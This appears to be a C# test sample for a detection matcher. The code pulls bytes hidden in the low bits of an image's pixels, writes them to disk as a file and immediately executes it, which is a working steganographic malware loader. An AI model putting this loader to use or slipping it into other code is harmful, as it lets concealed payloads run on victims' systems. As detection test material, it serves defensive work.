// Matcher control for image LSB byte reconstruction followed by activation.
using System.IO;
using System.Diagnostics;
class Decoder {
 void Load(System.Drawing.Bitmap bitmap, string path) {
  var output = new MemoryStream(); int value = 0;
  for (int x = 0; x < bitmap.Width; x++) {
   var pixel = bitmap.GetPixel(x, 0);
   value = (value << 1) | (pixel.B & 1);
   if (x % 8 == 7) output.WriteByte((byte)value);
  }
  System.IO.File.WriteAllBytes(path, output.ToArray());
  System.Diagnostics.Process.Start(path);
 }
}
